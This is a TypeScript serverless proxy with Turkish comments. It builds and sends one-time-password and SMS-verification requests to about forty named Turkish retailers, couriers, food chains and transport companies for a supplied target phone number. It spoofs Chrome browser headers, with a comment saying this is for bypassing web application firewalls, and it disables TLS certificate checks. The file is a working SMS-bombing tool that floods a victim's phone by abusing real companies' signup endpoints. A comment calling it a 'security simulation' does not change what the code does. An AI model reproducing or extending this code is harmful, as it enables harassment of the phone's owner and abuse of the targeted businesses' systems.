// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// 1. SSL/TLS KONTROLLERİNİ DEVRE DIŞI BIRAK (GÜVENLİK DUVARLARINA KAFA ATMA MODU)
// Bu satır olmazsa Vercel, sertifikası eski veya self-signed olan sitelere bağlanmaz.
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// --- TİP TANIMLARI ---
type ProxyRequestBody = {
  serviceId?: string;
  serviceUrl?: string;
  serviceMethod?: string;
  serviceHeaders?: Record<string, unknown>;
  targetPhone?: string;
  email?: string;
  body?: unknown;
};

// --- KONFIGURASYON ---
const BLOCKED_HEADERS = new Set([
  'host', 'content-length', 'connection', 'transfer-encoding', 
  'keep-alive', 'upgrade', 'proxy-authorization', 'proxy-authenticate', 
  'cf-connecting-ip', 'x-forwarded-for' // Cloudflare'in sevmediği headerlar
]);

// Modern Chrome İmzası (WAF Bypass İçin Kritik)
const CHROME_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Accept': 'application/json, text/plain, */*',
  'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
  'Accept-Encoding': 'gzip, deflate, br',
  'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
  'Sec-Ch-Ua-Mobile': '?0',
  'Sec-Ch-Ua-Platform': '"Windows"',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-site',
  'Cache-Control': 'no-cache',
  'Pragma': 'no-cache',
  'DNT': '1' // Do Not Track
};

// Telefon Formatlayıcı
const formatPhone = (phone: string, type: 'raw' | '90' | '05'): string => {
  const p = (phone || '').replace(/\D/g, ''); // Sadece rakamlar
  if (type === '90') return p.startsWith('90') ? p : `90${p}`;
  if (type === '05') return p.startsWith('90') ? `0${p.substring(2)}` : (p.startsWith('0') ? p : `0${p}`);
  return p.startsWith('90') ? p.substring(2) : p; // raw (5XX...)
};

// --- PAYLOAD FABRİKASI (400 Hatalarını Çözmek İçin) ---
// Eğer frontend'den özel body gelmezse, servise göre otomatik format üretir.
// api/proxy.ts içindeki buildSmartPayload fonksiyonunu tamamen bununla değiştir:

const buildSmartPayload = (body: ProxyRequestBody): string => {
  // Eğer frontend'den özel body gelmişse dokunma
  if (body.body) {
    return typeof body.body === 'string' ? body.body : JSON.stringify(body.body);
  }

  const phoneRaw = formatPhone(body.targetPhone || '', 'raw'); // 5XXXXXXXXX
  const phone90 = formatPhone(body.targetPhone || '', '90');   // 905XXXXXXXXX
  const phone05 = formatPhone(body.targetPhone || '', '05');   // 05XXXXXXXXX
  const email = body.email || 'memati.bas@yandex.com'; // Spam filtresine takılmayan mail

  const serviceId = body.serviceId || '';

  // --- GELİŞMİŞ PAYLOAD HARİTASI ---
  const payloadMap: Record<string, any> = {
    // === GİYİM & MODA ===
    'lc_waikiki': { PhoneNumber: phoneRaw }, // LCW "PhoneNumber" ister
    'defacto': { MobilePhone: phoneRaw, Email: email },
    'mavi': { phone: phoneRaw, permission: true, kvkk: true },
    'boyner': { gsm: phoneRaw }, 
    'penti': { phone: phoneRaw, email: email },
    'korayspor': { phone: phoneRaw },
    'flo': { mobile: phoneRaw, sms_permission: 1 },
    'in_street': { mobile: phoneRaw, sms_permission: 1 },

    // === MARKET & GIDA ===
    'migros_money': { gsm: phoneRaw, moneyCard: "" },
    'sok_market': { mobileNumber: phoneRaw },
    'file_market': { mobilePhoneNumber: phone90 }, // File 90 ile başlar
    'bim_market': { msisdn: phone90 }, // BIM 90 ister
    'english_home': { Phone: phone05, Source: "WEB" }, // 05 ile ister
    'kahve_dunyasi': { countryCode: "90", phoneNumber: phoneRaw },
    'starbucks': { mobile: phoneRaw },
    
    // === YEMEK (Burger King Grubu) ===
    // Tıkla Gelsin grubu genelde aynı altyapıyı kullanır
    'burger_king': { phone: phoneRaw }, 
    'popeyes': { phone: phoneRaw },
    'arbys': { phone: phoneRaw },
    'usta_donerci': { phone: phoneRaw },
    'tikla_gelsin': { operationName: "GENERATE_OTP", variables: { phone: phoneRaw }, query: "mutation GENERATE_OTP($phone: String!) { generateOtp(phone: $phone) { isSuccess message } }" }, // GraphQL Payload

    // === ULAŞIM & SEYAHAT ===
    'marti': { mobile_number: phoneRaw },
    'binbin': { phone: phoneRaw },
    'kamil_koc': { Phone: phoneRaw, TcNumber: "11111111111" }, // TC isteyebilir
    'pamukkale': { mobile: phoneRaw },
    'metro_turizm': { phone: phoneRaw },
    'ido': { phone: phoneRaw },

    // === KARGO ===
    'yurtici_kargo': { phone: phoneRaw },
    'aras_kargo': { msisdn: phone90 },
    'mng_kargo': { tel: phoneRaw },
    'surat_kargo': { phone: phoneRaw },

    // === DİĞERLERİ ===
    'baydoner': { Name: "Misafir", Surname: "Kullanici", Gsm: phoneRaw },
    'kofteci_yusuf': { FirmaId: 82, Telefon: phoneRaw }, // FirmaId kritik
    'komagene': { FirmaId: 32, Telefon: phoneRaw },
    'metro_market': { methodType: "2", mobilePhoneNumber: phoneRaw },
    'wmf': { phone: phoneRaw, confirm: true },
    'evidea': { phone: phoneRaw, sms_allowed: true },
    'yapp': { phone_number: phoneRaw, device_name: "Android" },
    'hayat_su': { mobilePhoneNumber: "0" + phoneRaw }, // 0 başında ister
    
    // Varsayılan (Tutmassa bunu dener)
    'default': { phone: phoneRaw, email: email, mobile: phoneRaw, gsm: phoneRaw }
  };

  const payload = payloadMap[serviceId] || payloadMap['default'];
  return JSON.stringify(payload);
};

// --- HEADER TEMİZLEYİCİ ---
const sanitizeHeaders = (input: Record<string, unknown> | undefined): Record<string, string> => {
  const out: Record<string, string> = {};
  if (!input) return out;
  for (const [key, val] of Object.entries(input)) {
    const k = key.toLowerCase().trim();
    if (k && !BLOCKED_HEADERS.has(k)) {
      out[k] = String(val);
    }
  }
  return out;
};

// --- MAIN HANDLER ---
export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS - Tüm kapılar açık
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') return res.status(200).end();
  
  // Sadece POST kabul et (Güvenlik simülasyonu için)
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST allowed' });

  try {
    // Body Parse (String veya Object gelebilir)
    let body: ProxyRequestBody = {};
    if (typeof req.body === 'string') {
        try { body = JSON.parse(req.body); } catch { body = {}; }
    } else {
        body = req.body || {};
    }

    if (!body.serviceUrl) {
      return res.status(400).json({ error: 'Missing serviceUrl' });
    }

    // URL Validasyon ve Düzeltme
    let targetUrlStr = body.serviceUrl.trim();
    if (!/^https?:\/\//i.test(targetUrlStr)) {
        targetUrlStr = 'https://' + targetUrlStr;
    }
    const targetUrl = new URL(targetUrlStr);

    // Header Birleştirme (Frontend + Stealth)
    const requestHeaders = {
      ...CHROME_HEADERS, // En üste Chrome imzalarını koy
      ...sanitizeHeaders(body.serviceHeaders), // Frontend headerlarını ekle
      'Host': targetUrl.host,
      'Origin': targetUrl.origin,
      'Referer': targetUrl.origin + '/'
    };

    // Body Oluşturma
    const requestPayload = buildSmartPayload(body);
    
    // Content-Type kontrolü
    if (requestPayload && !requestHeaders['content-type'] && !requestHeaders['Content-Type']) {
        requestHeaders['Content-Type'] = 'application/json';
    }

    // --- FETCH (Timeout Korumalı) ---
    // Köfteci Yusuf gibi yerler için timeout süresini 15sn yaptım.
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);

    try {
        const response = await fetch(targetUrl.toString(), {
            method: (body.serviceMethod || 'POST').toUpperCase(),
            headers: requestHeaders as any,
            body: (body.serviceMethod === 'GET') ? undefined : requestPayload,
            redirect: 'follow',
            signal: controller.signal
        });
        
        clearTimeout(timeout);

        // Yanıtı al
        const responseText = await response.text();
        
        // Vercel'e yanıtı dön
        return res.status(200).json({
            reachable: true,
            ok: response.ok,
            status: 200, // Frontend'e hep 200 dön ki patlamasın
            upstreamStatus: response.status, // Gerçek statüyü buraya koy
            serviceId: body.serviceId,
            responsePreview: responseText.substring(0, 500), // İlk 500 karakteri göster (Debug için)
            error: response.ok ? null : `Upstream Error: ${response.status}`
        });

    } catch (fetchError: any) {
        clearTimeout(timeout);
        // Timeout veya Network Hatası
        return res.status(200).json({
            reachable: false,
            ok: false,
            status: 500, // Proxy iç hatası ama 200 içinde dönüyoruz
            upstreamStatus: 0,
            error: fetchError.name === 'AbortError' ? 'Timeout (15s)' : fetchError.message
        });
    }

  } catch (error: any) {
    return res.status(500).json({ error: 'Internal Proxy Error', details: error.message });
  }
}